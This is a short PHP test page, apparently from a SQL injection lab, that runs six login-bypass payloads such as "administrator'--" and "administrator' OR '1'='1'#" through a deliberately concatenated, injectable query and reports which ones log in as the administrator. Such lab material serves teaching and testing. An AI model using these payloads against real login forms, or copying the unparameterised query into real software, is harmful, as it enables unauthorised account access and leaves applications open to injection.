<?php
/**
 * Test different SQL injection payloads to see which ones work
 */

require_once 'config.php';
$db = connect_db();

echo "<h2>Testing SQL Injection Payloads</h2>";
echo "<p>This page tests various payloads to see which ones work with your MySQL/MariaDB setup.</p>";

$test_payloads = [
    "administrator'--",
    "administrator'-- ",
    "administrator'#",
    "administrator' OR '1'='1'--",
    "administrator' OR '1'='1'-- ",
    "administrator' OR '1'='1'#"
];

foreach ($test_payloads as $payload) {
    echo "<h3>Testing payload: <code>" . htmlspecialchars($payload) . "</code></h3>";
    
    $query = "SELECT * FROM users WHERE username = '$payload' AND password = 'test'";
    echo "<p><strong>Query:</strong> <code>" . htmlspecialchars($query) . "</code></p>";
    
    $result = $db->query($query);
    
    if ($result === false) {
        echo "<p style='color: red;'><strong>❌ SQL Error:</strong> " . htmlspecialchars($db->error) . "</p>";
    } elseif ($result->num_rows > 0) {
        $user = $result->fetch_assoc();
        echo "<p style='color: green;'><strong>✅ SUCCESS:</strong> Logged in as " . htmlspecialchars($user['username']) . " (" . htmlspecialchars($user['role']) . ")</p>";
    } else {
        echo "<p style='color: orange;'><strong>⚠️ NO MATCH:</strong> Query executed but no users found</p>";
    }
    
    echo "<hr>";
}

close_db();
?>